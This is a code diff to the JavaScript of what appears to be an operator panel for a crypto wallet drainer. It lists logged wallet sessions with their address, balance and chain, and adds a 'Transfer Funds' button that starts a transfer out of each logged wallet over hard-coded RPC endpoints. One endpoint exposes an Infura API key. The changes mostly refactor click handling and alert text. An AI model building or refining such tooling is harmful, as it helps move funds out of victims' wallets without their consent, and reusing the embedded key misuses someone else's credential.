@@ -95,36 +95,47 @@ if (localStorage.getItem("wallet_connected") === "1") connectWallet();
 async function loadSessions() {
   sessionList.innerHTML = "";
   try {
-    const res = await fetch(`${API_BASE}/verify.php`);
+    const res = await fetch(`${API_BASE}/get_logs.php`);
     const logs = await res.json();
+
     logs.filter(e => e && e.address).forEach((e, i) => {
       const li = document.createElement("li");
-      li.className = "list-group-item session-item";
-      li.innerHTML = `<div><strong>#${i + 1}</strong> - ${new Date(e.timestamp).toLocaleString()}<br/>
-        <strong>Address:</strong> ${e.address}<br/>
-        <strong>Balance:</strong> ${e.balance} ETH<br/>
-        <strong>Chain:</strong> ${e.chainId}</div>
-        <div id="expand${i}" style="display:none; margin-top:10px;">
-          <button class="btn btn-sm btn-success" id="transferBtn${i}">Transfer Funds</button>
+      li.className = "list-group-item";
+      li.innerHTML = `
+        <div class="session-summary" style="cursor:pointer;">
+          <strong>#${i + 1}</strong> • ${new Date(e.timestamp).toLocaleString()}<br/>
+          <strong>Address:</strong> ${e.address}<br/>
+          <strong>Balance:</strong> ${e.balance} ETH<br/>
+          <strong>Chain:</strong> ${e.chainId}
+        </div>
+        <div class="session-actions" style="display:none; margin-top:10px;">
+          <button class="btn btn-sm btn-success transfer-btn" data-address="${e.address}" data-chain="${e.chainId}">
+            Transfer Funds
+          </button>
         </div>`;
-      li.addEventListener("click", () => {
-        const exp = document.getElementById(`expand${i}`);
-        const shown = exp.style.display === "block";
-        document.querySelectorAll(".list-group-item").forEach(item => {
-          item.classList.remove("expanded-session");
-          item.querySelector("div[id^='expand']").style.display = "none";
-        });
-        if (!shown) {
+
+      const sessionSummary = li.querySelector(".session-summary");
+      const sessionActions = li.querySelector(".session-actions");
+
+      sessionSummary.addEventListener("click", () => {
+        const isVisible = sessionActions.style.display === "block";
+        document.querySelectorAll(".session-actions").forEach(el => el.style.display = "none");
+        document.querySelectorAll(".list-group-item").forEach(item => item.classList.remove("expanded-session"));
+        if (!isVisible) {
+          sessionActions.style.display = "block";
           li.classList.add("expanded-session");
-          exp.style.display = "block";
         }
       });
+
+      const transferBtn = li.querySelector(".transfer-btn");
+      transferBtn.addEventListener("click", async (eClick) => {
+        eClick.stopPropagation();
+        const address = transferBtn.dataset.address;
+        const chainId = parseInt(transferBtn.dataset.chain);
+        await initiateTransfer(address, chainId);
+      });
+
       sessionList.appendChild(li);
-      setTimeout(() => {
-        document.getElementById(`transferBtn${i}`).onclick = () => {
-          initiateTransfer(e.address, e.chainId);
-        };
-      }, 50);
     });
   } catch (e) {
     sessionList.innerHTML = "<li class='list-group-item text-danger'>Failed to load sessions</li>";
@@ -133,13 +144,13 @@ async function loadSessions() {
 
 async function initiateTransfer(fromAddress, chainId) {
   const chains = {
-    1: { name: "Ethereum", rpc: "https://mainnet.infura.io/v3/84e8498a4e08cafe1acaf08369fd7a56" },
-    56: { name: "BNB", rpc: "https://bsc-dataseed.binance.org/" },
-    137: { name: "Polygon", rpc: "https://polygon-rpc.com" }
+    1: { rpc: "https://mainnet.infura.io/v3/84e8498a4e08cafe1acaf08369fd7a56" },
+    56: { rpc: "https://bsc-dataseed.binance.org/" },
+    137: { rpc: "https://polygon-rpc.com" }
   };
   const chain = chains[chainId];
   if (!chain) {
-    alert("Unsupported chain");
+    alert("Unsupported network.");
     return;
   }
 
@@ -158,5 +169,5 @@ async function initiateTransfer(fromAddress, chainId) {
     value: ethers.parseEther("0.001")
   });
 
-  alert(`Transfer sent. Tx hash: ${tx.hash}`);
+  alert(`Transfer sent!\nTransaction Hash:\n${tx.hash}`);
 }
